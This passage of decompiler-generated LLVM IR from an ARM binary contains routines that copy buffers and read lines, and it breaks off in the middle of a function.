  %v2_10f34 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_10f34, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10f3c = call i32 @function_122dc(i16* %v1_10f30, i32 %v2_10f34, i32 1)
  store i32 %v5_10f3c, i32* %r0.global-to-local, align 4
  %v2_10f40 = icmp eq i32 %v5_10f3c, 0
  br i1 %v2_10f40, label %dec_label_pc_10f4c, label %bb24

bb24:                                             ; preds = %dec_label_pc_10f30
  %v4_10f44 = load i8, i8* %stack_var_-17, align 1
  %v5_10f44 = sext i8 %v4_10f44 to i32
  store i32 %v5_10f44, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f50

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10f30, %dec_label_pc_10e74, %dec_label_pc_10f04
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10f50

dec_label_pc_10f50:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_10f18, %dec_label_pc_10e90, %dec_label_pc_10f4c
  %v2_10f54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10f54, i32* @r4, align 4
  store i32 %v6_10e38, i32* @r5, align 4
  store i32 %v9_10e38, i32* @lr, align 4
  %v1_10f58 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10f58

; uselistorder directives
  uselistorder i32 %v2_10eb8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10ec4, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_10e3c, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 1, 0, 11, 3, 2, 12, 4, 5, 6, 7, 8, 13, 10 }
  uselistorder i32 128, { 7, 0, 3, 4, 14, 6, 5, 10, 1, 8, 9, 11, 12, 2, 13 }
  uselistorder label %dec_label_pc_10f50, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_10f4c, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @function_10f64(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10f64:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_10f64 = load i32, i32* @r6, align 4
  %v12_10f64 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f68 = icmp eq i32 %arg2, 0
  store i1 %v2_10f68, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_10ff0, label %dec_label_pc_10fd8.preheader

dec_label_pc_10fd8.preheader:                     ; preds = %dec_label_pc_10f64
  store i32 %tmp, i32* @r5, align 4
  %v1_10fd82 = add i32 %arg2, -1
  store i32 %v1_10fd82, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd88 = icmp eq i32 %arg2, 1
  store i1 %v7_10fd88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd88, label %dec_label_pc_10fe0, label %dec_label_pc_10f84

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10fd8.preheader, %dec_label_pc_10fd8.backedge.dec_label_pc_10f84_crit_edge
  %v0_10fa8 = phi i32 [ %v0_10f84.pre, %dec_label_pc_10fd8.backedge.dec_label_pc_10f84_crit_edge ], [ %arg3, %dec_label_pc_10fd8.preheader ]
  %v1_10f84 = add i32 %v0_10fa8, 16
  %v2_10f84 = inttoptr i32 %v1_10f84 to i32*
  %v3_10f84 = load i32, i32* %v2_10f84, align 4
  store i32 %v3_10f84, i32* %r2.global-to-local, align 4
  %v1_10f88 = add i32 %v0_10fa8, 24
  %v2_10f88 = inttoptr i32 %v1_10f88 to i32*
  %v3_10f88 = load i32, i32* %v2_10f88, align 4
  store i32 %v3_10f88, i32* %r3.global-to-local, align 4
  %v3_10f8c = icmp uge i32 %v3_10f84, %v3_10f88
  store i1 %v3_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v9_10f8c = icmp eq i32 %v3_10f84, %v3_10f88
  store i1 %v9_10f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10f8c, label %dec_label_pc_10fa8, label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f84
  %v1_10f94 = inttoptr i32 %v3_10f84 to i8*
  %v2_10f94 = load i8, i8* %v1_10f94, align 1
  %v3_10f94 = zext i8 %v2_10f94 to i32
  store i32 %v3_10f94, i32* %r3.global-to-local, align 4
  %v5_10f94 = add i32 %v3_10f84, 1
  store i32 %v5_10f94, i32* %r2.global-to-local, align 4
  %v2_10f98 = load i32, i32* @r5, align 4
  %v3_10f98 = inttoptr i32 %v2_10f98 to i8*
  store i8 %v2_10f94, i8* %v3_10f98, align 1
  %v4_10f98 = load i32, i32* @r5, align 4
  %v5_10f98 = add i32 %v4_10f98, 1
  store i32 %v5_10f98, i32* @r5, align 4
  %v0_10f9c = load i32, i32* %r3.global-to-local, align 4
  %v2_10f9c = icmp ugt i32 %v0_10f9c, 9
  store i1 %v2_10f9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f9c = icmp eq i32 %v0_10f9c, 10
  store i1 %v7_10f9c, i1* %cpsr_z.global-to-local, align 1
  %v0_10fa0 = load i32, i32* %r2.global-to-local, align 4
  %v1_10fa0 = load i32, i32* @r4, align 4
  %v2_10fa0 = add i32 %v1_10fa0, 16
  %v3_10fa0 = inttoptr i32 %v2_10fa0 to i32*
  store i32 %v0_10fa0, i32* %v3_10fa0, align 4
  br i1 %v7_10f9c, label %dec_label_pc_10fe0, label %dec_label_pc_10fd8.backedge

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10f84
  %v1_10fa8 = inttoptr i32 %v0_10fa8 to i16*
  %v3_10fac = call i32 @function_10e38(i16* %v1_10fa8)
  %v3_10fb0 = icmp eq i32 %v3_10fac, -1
  store i1 %v3_10fb0, i1* %cpsr_c.global-to-local, align 1
  %v8_10fb0 = icmp eq i32 %v3_10fac, -1
  store i1 %v8_10fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_10fb4 = urem i32 %v3_10fac, 256
  store i32 %v1_10fb4, i32* %r3.global-to-local, align 4
  br i1 %v3_10fb0, label %dec_label_pc_10fbc, label %dec_label_pc_10fd4

dec_label_pc_10fbc:                               ; preds = %dec_label_pc_10fa8
  %v0_10fbc = load i32, i32* @r4, align 4
  %v1_10fbc = inttoptr i32 %v0_10fbc to i16*
  %v2_10fbc = load i16, i16* %v1_10fbc, align 2
  %v3_10fbc = zext i16 %v2_10fbc to i32
  store i32 %v3_10fbc, i32* %r3.global-to-local, align 4
  %v1_10fc0 = and i32 %v3_10fbc, 8
  %v2_10fc0 = icmp eq i32 %v1_10fc0, 0
  store i1 %v2_10fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10fc0, label %dec_label_pc_10fe0, label %dec_label_pc_10ff0

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fa8
  %v1_10fcc = trunc i32 %v3_10fac to i8
  %v2_10fcc = load i32, i32* @r5, align 4
  %v3_10fcc = inttoptr i32 %v2_10fcc to i8*
  store i8 %v1_10fcc, i8* %v3_10fcc, align 1
  %v4_10fcc = load i32, i32* @r5, align 4
  %v5_10fcc = add i32 %v4_10fcc, 1
  store i32 %v5_10fcc, i32* @r5, align 4
  %v0_10fd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10fd0 = icmp ugt i32 %v0_10fd0, 9
  store i1 %v2_10fd0, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd0 = icmp eq i32 %v0_10fd0, 10
  store i1 %v7_10fd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd0, label %dec_label_pc_10fe0, label %dec_label_pc_10fd8.backedge

dec_label_pc_10fd8.backedge:                      ; preds = %dec_label_pc_10fd4, %dec_label_pc_10f94
  %v0_10fd8 = load i32, i32* @r6, align 4
  %v1_10fd8 = add i32 %v0_10fd8, -1
  store i32 %v1_10fd8, i32* @r6, align 4
  %v2_10fd8 = icmp ne i32 %v0_10fd8, 0
  store i1 %v2_10fd8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fd8 = icmp eq i32 %v0_10fd8, 1
  store i1 %v7_10fd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fd8, label %dec_label_pc_10fe0, label %dec_label_pc_10fd8.backedge.dec_label_pc_10f84_crit_edge

dec_label_pc_10fd8.backedge.dec_label_pc_10f84_crit_edge: ; preds = %dec_label_pc_10fd8.backedge
  %v0_10f84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10f84

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fd4, %dec_label_pc_10fd8.backedge, %dec_label_pc_10f94, %dec_label_pc_10fd8.preheader, %dec_label_pc_10fbc
  %v0_10fe0 = load i32, i32* @r5, align 4
  %v1_10fe0 = load i32, i32* @r7, align 4
  %v3_10fe0 = icmp uge i32 %v0_10fe0, %v1_10fe0
  store i1 %v3_10fe0, i1* %cpsr_c.global-to-local, align 1
  %v9_10fe0 = icmp eq i32 %v0_10fe0, %v1_10fe0
  store i1 %v9_10fe0, i1* %cpsr_z.global-to-local, align 1
  %v2_10fe4 = xor i1 %v9_10fe0, true
  %v3_10fe4 = and i1 %v3_10fe0, %v2_10fe4
  br i1 %v3_10fe4, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_10fe0
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_10fe8 = inttoptr i32 %v0_10fe0 to i8*
  store i8 0, i8* %v7_10fe8, align 1
  %v0_10fec.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_10fec.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_10fe0, %bb
  %v1_10fec = phi i1 [ %v1_10fec.pre, %bb ], [ %v9_10fe0, %dec_label_pc_10fe0 ]
  %v0_10fec = phi i1 [ %v0_10fec.pre, %bb ], [ %v3_10fe0, %dec_label_pc_10fe0 ]
  %v2_10fec = xor i1 %v1_10fec, true
  %v3_10fec = and i1 %v0_10fec, %v2_10fec
  br i1 %v3_10fec, label %.dec_label_pc_10ff4_crit_edge, label %dec_label_pc_10ff0

.dec_label_pc_10ff4_crit_edge:                    ; preds = %.thread14
  %v0_10ff4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10ff4

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10f64, %dec_label_pc_10fbc, %.thread14
  br label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %.dec_label_pc_10ff4_crit_edge, %dec_label_pc_10ff0
  %v0_10ff4 = phi i32 [ %v0_10ff4.pre, %.dec_label_pc_10ff4_crit_edge ], [ 0, %dec_label_pc_10ff0 ]
  store i32 %v9_10f64, i32* @r6, align 4
  store i32 %v12_10f64, i32* @r7, align 4
  ret i32 %v0_10ff4

; uselistorder directives
  uselistorder i1 %v9_10fe0, { 1, 0, 2 }
  uselistorder i32 %v1_10fe0, { 1, 0 }
  uselistorder i32 %v0_10fe0, { 0, 2, 1 }
  uselistorder i32 %v0_10fd8, { 2, 0, 1 }
  uselistorder i32 %v0_10fd0, { 1, 0 }
  uselistorder i32 %v3_10fac, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10f9c, { 1, 0 }
  uselistorder i32 %v3_10f84, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10fa8, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 10, { 15, 16, 17, 7, 27, 26, 35, 28, 29, 0, 21, 9, 20, 1, 30, 10, 2, 14, 18, 19, 22, 5, 4, 3, 11, 23, 6, 24, 8, 12, 25, 31, 32, 33, 34, 13 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10ff4, { 1, 0 }
  uselistorder label %dec_label_pc_10ff0, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_10fe0, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10f84, { 1, 0 }
}

define i32 @function_11010() local_unnamed_addr {
dec_label_pc_11010:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_11010 = load i32, i32* @r1, align 4
  %v1_11010 = load i32, i32* @r0, align 4
  %v9_11010 = icmp eq i32 %v0_11010, %v1_11010
  %v1_11014 = icmp ult i32 %v0_11010, %v1_11010
  call void @__pseudo_cond_branch(i1 %v1_11014, i32 ptrtoint (i32* @global_var_11264.492 to i32))
  %v2_11018 = load i32, i32* @r0, align 4
  br i1 %v9_11010, label %bb, label %bb18

bb:                                               ; preds = %bb21, %.thread5, %dec_label_pc_11010
  %merge = phi i32 [ %v2_11018, %dec_label_pc_11010 ], [ %v10_1109c, %.thread5 ], [ %v12_110a4, %bb21 ]
  ret i32 %merge

bb18:                                             ; preds = %dec_label_pc_11010
  %v0_11020 = load i32, i32* @r2, align 4
  %v1_11020 = add i32 %v0_11020, -4
  store i32 %v1_11020, i32* %r2.global-to-local, align 4
  %v3_11020 = sub i32 3, %v0_11020
  %v4_11020 = and i32 %v3_11020, %v0_11020
  %v5_11020 = icmp slt i32 %v4_11020, 0
  %v6_11020 = icmp slt i32 %v1_11020, 0
  %v2_11024 = xor i1 %v6_11020, %v5_11020
  call void @__pseudo_cond_branch(i1 %v2_11024, i32 ptrtoint (i32* @global_var_110ac.493 to i32))
  %v0_11028 = load i32, i32* @r0, align 4
  %v1_11028 = urem i32 %v0_11028, 4
  store i32 %v1_11028, i32* %ip.global-to-local, align 4
  %v1_1102c = icmp ne i32 %v1_11028, 0
  call void @__pseudo_cond_branch(i1 %v1_1102c, i32 ptrtoint (i32* @global_var_110dc.494 to i32))
  %v0_11030 = load i32, i32* @r1, align 4
  %v1_11030 = urem i32 %v0_11030, 4
  store i32 %v1_11030, i32* %ip.global-to-local, align 4
  %v1_11034 = icmp ne i32 %v1_11030, 0
  call void @__pseudo_cond_branch(i1 %v1_11034, i32 ptrtoint (i32* @global_var_1110c.495 to i32))
  %v0_11038 = load i32, i32* %r2.global-to-local, align 4
  %v2_11038 = add i32 %v0_11038, -8
  store i32 %v2_11038, i32* %r2.global-to-local, align 4
  %v5_1103c = icmp slt i32 %v0_11038, 8
  br i1 %v5_1103c, label %dec_label_pc_1108c, label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %bb18
  %v2_11040 = add i32 %v0_11038, -28
  store i32 %v2_11040, i32* %r2.global-to-local, align 4
  %v5_11044 = icmp slt i32 %v2_11038, 20
  br i1 %v5_11044, label %dec_label_pc_11078, label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %dec_label_pc_11040
  %v0_11048 = load i32, i32* @r4, align 4
  store i32 %v0_11048, i32* %stack_var_-12, align 4
  %v0_11050.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1104c

dec_label_pc_1104c:                               ; preds = %dec_label_pc_1104c, %dec_label_pc_11048
  %v0_11050 = phi i32 [ %v12_11058, %dec_label_pc_1104c ], [ %v0_11050.pre, %dec_label_pc_11048 ]
  %v0_1104c = load i32, i32* @r1, align 4
  %v1_1104c = inttoptr i32 %v0_1104c to i32*
  %v2_1104c = load i32, i32* %v1_1104c, align 4
  %v3_1104c = add i32 %v0_1104c, 4
  %v4_1104c = inttoptr i32 %v3_1104c to i32*
  %v5_1104c = load i32, i32* %v4_1104c, align 4
  store i32 %v5_1104c, i32* %r4.global-to-local, align 4
  %v6_1104c = add i32 %v0_1104c, 8
  %v7_1104c = inttoptr i32 %v6_1104c to i32*
  %v8_1104c = load i32, i32* %v7_1104c, align 4
  store i32 %v8_1104c, i32* %ip.global-to-local, align 4
  %v9_1104c = add i32 %v0_1104c, 12
  %v10_1104c = inttoptr i32 %v9_1104c to i32*
  %v11_1104c = load i32, i32* %v10_1104c, align 4
  store i32 %v11_1104c, i32* %lr.global-to-local, align 4
  %v12_1104c = add i32 %v0_1104c, 16
  store i32 %v12_1104c, i32* %r1.global-to-local, align 4
  %v1_11050 = inttoptr i32 %v0_11050 to i32*
  store i32 %v2_1104c, i32* %v1_11050, align 4
  %v3_11050 = add i32 %v0_11050, 4
  %v4_11050 = inttoptr i32 %v3_11050 to i32*
  %v5_11050 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11050, i32* %v4_11050, align 4
  %v6_11050 = add i32 %v0_11050, 8
  %v7_11050 = inttoptr i32 %v6_11050 to i32*
  %v8_11050 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_11050, i32* %v7_11050, align 4
  %v9_11050 = add i32 %v0_11050, 12
  %v10_11050 = inttoptr i32 %v9_11050 to i32*
  %v11_11050 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_11050, i32* %v10_11050, align 4
  %v12_11050 = add i32 %v0_11050, 16
  %v0_11054 = load i32, i32* %r1.global-to-local, align 4
  %v1_11054 = inttoptr i32 %v0_11054 to i32*
  %v2_11054 = load i32, i32* %v1_11054, align 4
  %v3_11054 = add i32 %v0_11054, 4
  %v4_11054 = inttoptr i32 %v3_11054 to i32*
  %v5_11054 = load i32, i32* %v4_11054, align 4
  store i32 %v5_11054, i32* %r4.global-to-local, align 4
  %v6_11054 = add i32 %v0_11054, 8
  %v7_11054 = inttoptr i32 %v6_11054 to i32*
  %v8_11054 = load i32, i32* %v7_11054, align 4
  store i32 %v8_11054, i32* %ip.global-to-local, align 4
  %v9_11054 = add i32 %v0_11054, 12
  %v10_11054 = inttoptr i32 %v9_11054 to i32*
  %v11_11054 = load i32, i32* %v10_11054, align 4
  store i32 %v11_11054, i32* @lr, align 4
  %v12_11054 = add i32 %v0_11054, 16
  store i32 %v12_11054, i32* @r1, align 4
  %v1_11058 = inttoptr i32 %v12_11050 to i32*
  store i32 %v2_11054, i32* %v1_11058, align 4
  %v3_11058 = add i32 %v0_11050, 20
  %v4_11058 = inttoptr i32 %v3_11058 to i32*
  %v5_11058 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11058, i32* %v4_11058, align 4
  %v6_11058 = add i32 %v0_11050, 24
  %v7_11058 = inttoptr i32 %v6_11058 to i32*
  %v8_11058 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_11058, i32* %v7_11058, align 4
  %v9_11058 = add i32 %v0_11050, 28
  %v10_11058 = inttoptr i32 %v9_11058 to i32*
  %v11_11058 = load i32, i32* @lr, align 4
  store i32 %v11_11058, i32* %v10_11058, align 4
  %v12_11058 = add i32 %v0_11050, 32
  store i32 %v12_11058, i32* @r0, align 4
  %v0_1105c = load i32, i32* %r2.global-to-local, align 4
  %v2_1105c = add i32 %v0_1105c, -32
  store i32 %v2_1105c, i32* %r2.global-to-local, align 4
  %v6_11060 = icmp slt i32 %v0_1105c, 32
  br i1 %v6_11060, label %dec_label_pc_11064, label %dec_label_pc_1104c

dec_label_pc_11064:                               ; preds = %dec_label_pc_1104c
  %v5_11068 = icmp slt i32 %v2_1105c, -16
  br i1 %v5_11068, label %.thread1, label %bb19

bb19:                                             ; preds = %dec_label_pc_11064
  %v6_11068 = load i32, i32* @r1, align 4
  %v7_11068 = inttoptr i32 %v6_11068 to i32*
  %v8_11068 = load i32, i32* %v7_11068, align 4
  %v9_11068 = add i32 %v6_11068, 4
  %v10_11068 = inttoptr i32 %v9_11068 to i32*
  %v11_11068 = load i32, i32* %v10_11068, align 4
  store i32 %v11_11068, i32* %r4.global-to-local, align 4
  %v12_11068 = add i32 %v6_11068, 8
  %v13_11068 = inttoptr i32 %v12_11068 to i32*
  %v14_11068 = load i32, i32* %v13_11068, align 4
  store i32 %v14_11068, i32* %ip.global-to-local, align 4
  %v15_11068 = add i32 %v6_11068, 12
  %v16_11068 = inttoptr i32 %v15_11068 to i32*
  %v17_11068 = load i32, i32* %v16_11068, align 4
  store i32 %v17_11068, i32* @lr, align 4
  %v18_11068 = add i32 %v6_11068, 16
  store i32 %v18_11068, i32* @r1, align 4
  %v7_1106c = inttoptr i32 %v12_11058 to i32*
  store i32 %v8_11068, i32* %v7_1106c, align 4
  %v9_1106c = add i32 %v0_11050, 36
  %v10_1106c = inttoptr i32 %v9_1106c to i32*
  %v11_1106c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1106c, i32* %v10_1106c, align 4
  %v12_1106c = add i32 %v0_11050, 40
  %v13_1106c = inttoptr i32 %v12_1106c to i32*
  %v14_1106c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v14_1106c, i32* %v13_1106c, align 4
  %v15_1106c = add i32 %v0_11050, 44
  %v16_1106c = inttoptr i32 %v15_1106c to i32*
  %v17_1106c = load i32, i32* @lr, align 4
  store i32 %v17_1106c, i32* %v16_1106c, align 4
  %v18_1106c = add i32 %v0_11050, 48
  store i32 %v18_1106c, i32* @r0, align 4
  %v6_11070 = load i32, i32* %r2.global-to-local, align 4
  %v7_11070 = add i32 %v6_11070, -16
  store i32 %v7_11070, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_11064, %bb19
  %v0_110788 = phi i32 [ %v2_1105c, %dec_label_pc_11064 ], [ %v7_11070, %bb19 ]
  %v2_11074 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11074, i32* @r4, align 4
  br label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %dec_label_pc_11040, %.thread1
  %v0_11078 = phi i32 [ %v2_11040, %dec_label_pc_11040 ], [ %v0_110788, %.thread1 ]
  %v1_11078 = add i32 %v0_11078, 20
  store i32 %v1_11078, i32* %r2.global-to-local, align 4
  %v3_11078 = sub i32 0, %v0_11078
  %v4_11078 = and i32 %v1_11078, %v3_11078
  %v5_11078 = icmp slt i32 %v4_11078, 0
  %v6_11078 = icmp slt i32 %v1_11078, 0
  br label %dec_label_pc_1107c

dec_label_pc_1107c:                               ; preds = %.thread15, %dec_label_pc_11078
  %v0_1108c.pre22 = phi i32 [ %v0_1108c.pre, %.thread15 ], [ %v1_11078, %dec_label_pc_11078 ]
  %v1_11084 = phi i1 [ %v1_11088, %.thread15 ], [ %v5_11078, %dec_label_pc_11078 ]
  %v0_11084 = phi i1 [ %v0_11088, %.thread15 ], [ %v6_11078, %dec_label_pc_11078 ]
  %v2_1107c = xor i1 %v1_11084, %v0_11084
  br i1 %v2_1107c, label %.thread15, label %bb20

bb20:                                             ; preds = %dec_label_pc_1107c
  %v3_1107c = load i32, i32* @r1, align 4
  %v4_1107c = inttoptr i32 %v3_1107c to i32*
  %v5_1107c = load i32, i32* %v4_1107c, align 4
  %v6_1107c = add i32 %v3_1107c, 4
  %v7_1107c = inttoptr i32 %v6_1107c to i32*
  %v8_1107c = load i32, i32* %v7_1107c, align 4
  store i32 %v8_1107c, i32* %ip.global-to-local, align 4
  %v9_1107c = add i32 %v3_1107c, 8
  %v10_1107c = inttoptr i32 %v9_1107c to i32*
  %v11_1107c = load i32, i32* %v10_1107c, align 4
  store i32 %v11_1107c, i32* @lr, align 4
  %v12_1107c = add i32 %v3_1107c, 12
  store i32 %v12_1107c, i32* @r1, align 4
  %v3_11080 = load i32, i32* @r0, align 4
  %v4_11080 = inttoptr i32 %v3_11080 to i32*
  store i32 %v5_1107c, i32* %v4_11080, align 4
  %v6_11080 = add i32 %v3_11080, 4
  %v7_11080 = inttoptr i32 %v6_11080 to i32*
  %v8_11080 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_11080, i32* %v7_11080, align 4
  %v9_11080 = add i32 %v3_11080, 8
  %v10_11080 = inttoptr i32 %v9_11080 to i32*
  %v11_11080 = load i32, i32* @lr, align 4
  store i32 %v11_11080, i32* %v10_11080, align 4
  %v12_11080 = add i32 %v3_11080, 12
  store i32 %v12_11080, i32* @r0, align 4
  %v3_11084 = load i32, i32* %r2.global-to-local, align 4
  %v4_11084 = add i32 %v3_11084, -12
  store i32 %v4_11084, i32* %r2.global-to-local, align 4
  %v6_11084 = sub i32 11, %v3_11084
  %v7_11084 = and i32 %v6_11084, %v3_11084
  %v8_11084 = icmp slt i32 %v7_11084, 0
  %v9_11084 = icmp slt i32 %v4_11084, 0
  br label %.thread15

.thread15:                                        ; preds = %dec_label_pc_1107c, %bb20
  %v0_1108c.pre = phi i32 [ %v4_11084, %bb20 ], [ %v0_1108c.pre22, %dec_label_pc_1107c ]
  %v1_11088 = phi i1 [ %v8_11084, %bb20 ], [ %v1_11084, %dec_label_pc_1107c ]
  %v0_11088 = phi i1 [ %v9_11084, %bb20 ], [ %v0_11084, %dec_label_pc_1107c ]
  %v2_11088 = xor i1 %v1_11088, %v0_11088
  br i1 %v2_11088, label %dec_label_pc_1108c, label %dec_label_pc_1107c

dec_label_pc_1108c:                               ; preds = %.thread15, %bb18
  %v0_1108c = phi i32 [ %v2_11038, %bb18 ], [ %v0_1108c.pre, %.thread15 ]
  %v1_1108c = add i32 %v0_1108c, 8
  store i32 %v1_1108c, i32* %r2.global-to-local, align 4
  %v3_1108c = sub i32 0, %v0_1108c
  %v4_1108c = and i32 %v1_1108c, %v3_1108c
  %v5_1108c = icmp slt i32 %v4_1108c, 0
  %v6_1108c = icmp slt i32 %v1_1108c, 0
  %v2_11090 = xor i1 %v6_1108c, %v5_1108c
  call void @__pseudo_cond_branch(i1 %v2_11090, i32 ptrtoint (i32* @global_var_110ac.493 to i32))
  %v0_11094 = load i32, i32* %r2.global-to-local, align 4
  %v6_11094 = add i32 %v0_11094, -4
  store i32 %v6_11094, i32* %r2.global-to-local, align 4
  %v5_11098 = icmp slt i32 %v0_11094, 4
  %v6_11098 = load i32, i32* @r1, align 4
  %v7_11098 = inttoptr i32 %v6_11098 to i32*
  %v8_11098 = load i32, i32* %v7_11098, align 4
  %v10_11098 = add i32 %v6_11098, 4
  br i1 %v5_11098, label %.thread5, label %bb21

.thread5:                                         ; preds = %dec_label_pc_1108c
  store i32 %v10_11098, i32* %r1.global-to-local, align 4
  %v7_1109c = load i32, i32* @r0, align 4
  %v8_1109c = inttoptr i32 %v7_1109c to i32*
  store i32 %v8_11098, i32* %v8_1109c, align 4
  %v9_1109c = load i32, i32* @r0, align 4
  %v10_1109c = add i32 %v9_1109c, 4
  br label %bb

bb21:                                             ; preds = %dec_label_pc_1108c
  %v10_110a0 = inttoptr i32 %v10_11098 to i32*
  %v11_110a0 = load i32, i32* %v10_110a0, align 4
  store i32 %v11_110a0, i32* %ip.global-to-local, align 4
  %v12_110a0 = add i32 %v6_11098, 8
  store i32 %v12_110a0, i32* %r1.global-to-local, align 4
  %v6_110a4 = load i32, i32* @r0, align 4
  %v7_110a4 = inttoptr i32 %v6_110a4 to i32*
  store i32 %v8_11098, i32* %v7_110a4, align 4
  %v9_110a4 = add i32 %v6_110a4, 4
  %v10_110a4 = inttoptr i32 %v9_110a4 to i32*
  %v11_110a4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_110a4, i32* %v10_110a4, align 4
  %v12_110a4 = add i32 %v6_110a4, 8
  %v6_110a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_110a8 = add i32 %v6_110a8, -4
  store i32 %v7_110a8, i32* %r2.global-to-local, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v8_11098, { 1, 0 }
  uselistorder i32 %v1_1108c, { 1, 0, 2 }
  uselistorder i32 %v4_11084, { 0, 2, 1 }
  uselistorder i1 %v0_11084, { 1, 0 }
  uselistorder i1 %v1_11084, { 1, 0 }
  uselistorder i32 %v1_11078, { 0, 2, 1, 3 }
  uselistorder i32 %v12_11058, { 0, 2, 1 }
  uselistorder i32 %v0_11050, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_11020, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %dec_label_pc_11078, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_110ac() local_unnamed_addr {
dec_label_pc_110ac:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v0_110ac.pre = load i32, i32* @r2, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread16, %dec_label_pc_11184, %dec_label_pc_110ac
  %v0_110ac = phi i32 [ %v0_110ac.pre, %dec_label_pc_110ac ], [ %v0_110ac3, %dec_label_pc_11184 ], [ %v2_110fc, %.thread16 ]
  %v1_110ac = add i32 %v0_110ac, 4
  store i32 %v1_110ac, i32* %r2.global-to-local, align 4
  %v3_110ac = sub i32 0, %v0_110ac
  %v4_110ac = and i32 %v1_110ac, %v3_110ac
